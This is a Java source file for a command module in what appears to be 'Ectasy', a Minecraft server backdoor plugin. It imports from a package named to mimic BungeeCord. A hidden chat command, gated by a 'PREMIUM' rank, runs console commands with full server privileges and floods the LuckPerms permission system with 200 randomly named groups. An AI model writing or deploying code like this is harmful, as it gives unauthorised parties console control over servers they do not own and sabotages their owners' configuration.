package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.concurrent.ThreadLocalRandom;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "spamlp",
   description = "Spams LP data",
   blatant = true,
   rank = Rank.PREMIUM
)
public class SpamLPCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      for (int i = 0; i < 200; i++) {
         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "lp creategroup " + ThreadLocalRandom.current().nextInt(1, 100000)));
      }
   }
}
